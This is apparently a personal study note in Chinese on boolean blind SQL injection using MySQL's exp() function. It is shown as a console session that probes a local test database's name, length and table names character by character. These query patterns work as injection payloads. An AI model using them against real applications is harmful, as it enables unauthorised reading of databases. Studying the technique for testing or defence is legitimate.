exp的方式去搞盲注
mysql> select exp(if((substr(database(),1,4)='test'),1,4));
+----------------------------------------------+
| exp(if((substr(database(),1,4)='test'),1,4)) |
+----------------------------------------------+
|                            2.718281828459045 |
+----------------------------------------------+
1 row in set (0.00 sec)

mysql> select exp(if((ascii(substr((select table_name from information_schema.ta
bles where table_schema=database() limit 0,1),1,1))),1,4));
+-------------------------------------------------------------------------------
-----------------------------------------------+
| exp(if((ascii(substr((select table_name from information_schema.tables where t
able_schema=database() limit 0,1),1,1))),1,4)) |
+-------------------------------------------------------------------------------
-----------------------------------------------+
|
                             2.718281828459045 |
+-------------------------------------------------------------------------------
-----------------------------------------------+
1 row in set (0.00 sec)

mysql> select exp(if((ascii(substr((select table_name from information_schema.ta
bles where table_schema=database() limit 0,1),1,1))=75),1,4));
+-------------------------------------------------------------------------------
--------------------------------------------------+
| exp(if((ascii(substr((select table_name from information_schema.tables where t
able_schema=database() limit 0,1),1,1))=75),1,4)) |
+-------------------------------------------------------------------------------
--------------------------------------------------+
|
                               54.598150033144236 |
+-------------------------------------------------------------------------------
--------------------------------------------------+
1 row in set (0.00 sec)

mysql> select exp(if((ascii(substr((select table_name from information_schema.ta
bles where table_schema=database() limit 0,1),0,1))=75),1,4));
+-------------------------------------------------------------------------------
--------------------------------------------------+
| exp(if((ascii(substr((select table_name from information_schema.tables where t
able_schema=database() limit 0,1),0,1))=75),1,4)) |
+-------------------------------------------------------------------------------
--------------------------------------------------+
|
                               54.598150033144236 |
+-------------------------------------------------------------------------------
--------------------------------------------------+
1 row in set (0.00 sec)

mysql> select exp(if((ascii(substr((select table_name from information_schema.ta
bles where table_schema=database() limit 0,1),0,1))),1,4));
+-------------------------------------------------------------------------------
-----------------------------------------------+
| exp(if((ascii(substr((select table_name from information_schema.tables where t
able_schema=database() limit 0,1),0,1))),1,4)) |
+-------------------------------------------------------------------------------
-----------------------------------------------+
|
                            54.598150033144236 |
+-------------------------------------------------------------------------------
-----------------------------------------------+
1 row in set (0.00 sec)

mysql> select exp(if((ascii(substr((select table_name from information_schema.ta
bles where table_schema=database() limit 0,1),2,1))),1,4));
+-------------------------------------------------------------------------------
-----------------------------------------------+
| exp(if((ascii(substr((select table_name from information_schema.tables where t
able_schema=database() limit 0,1),2,1))),1,4)) |
+-------------------------------------------------------------------------------
-----------------------------------------------+
|
                             2.718281828459045 |
+-------------------------------------------------------------------------------
-----------------------------------------------+
1 row in set (0.00 sec)

mysql> select exp(if((ascii(substr((select table_name from information_schema.ta
bles where table_schema=database() limit 0,1),5,1))),1,4));
+-------------------------------------------------------------------------------
-----------------------------------------------+
| exp(if((ascii(substr((select table_name from information_schema.tables where t
able_schema=database() limit 0,1),5,1))),1,4)) |
+-------------------------------------------------------------------------------
-----------------------------------------------+
|
                             2.718281828459045 |
+-------------------------------------------------------------------------------
-----------------------------------------------+
1 row in set (0.00 sec)

mysql> select exp(if((ascii(substr((select table_name from information_schema.ta
bles where table_schema=database() limit 0,1),6,1))),1,4));
+-------------------------------------------------------------------------------
-----------------------------------------------+
| exp(if((ascii(substr((select table_name from information_schema.tables where t
able_schema=database() limit 0,1),6,1))),1,4)) |
+-------------------------------------------------------------------------------
-----------------------------------------------+
|
                            54.598150033144236 |
+-------------------------------------------------------------------------------
-----------------------------------------------+
1 row in set (0.00 sec)

mysql> select table_name from information_schema.tables where table_schema=datab
ase();
+------------+
| table_name |
+------------+
| users      |
+------------+
1 row in set (0.00 sec)

mysql> select exp(if((ascii(substr((select table_name from information_schema.ta
bles where table_schema=database() limit 0,1),1,1))=117),1,4));
+-------------------------------------------------------------------------------
---------------------------------------------------+
| exp(if((ascii(substr((select table_name from information_schema.tables where t
able_schema=database() limit 0,1),1,1))=117),1,4)) |
+-------------------------------------------------------------------------------
---------------------------------------------------+
|
                                 2.718281828459045 |
+-------------------------------------------------------------------------------
---------------------------------------------------+
1 row in set (0.00 sec)

mysql> select exp(if((length(database())=4),1,4))
    -> ;
+-------------------------------------+
| exp(if((length(database())=4),1,4)) |
+-------------------------------------+
|                   2.718281828459045 |
+-------------------------------------+
1 row in set (0.00 sec)
